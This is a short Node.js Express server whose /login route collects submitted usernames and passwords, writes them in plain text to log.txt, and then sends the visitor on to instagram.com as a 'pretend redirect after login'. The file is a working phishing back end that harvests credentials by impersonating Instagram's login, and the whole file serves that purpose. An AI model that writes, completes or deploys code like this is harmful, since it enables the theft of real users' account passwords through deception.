const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static("public")); // serves HTML/CSS/JS from public folder

app.post("/login", (req, res) => {
  const { username, password } = req.body;
  const logData = `Username: ${username} | Password: ${password}\n`;

  fs.appendFile("log.txt", logData, (err) => {
    if (err) {
      console.error("Failed to write to log.txt");
    }
  });

  res.redirect("https://instagram.com"); // pretend redirect after login
});

app.listen(10000, () => {
  console.log("Server running on port 10000");
});
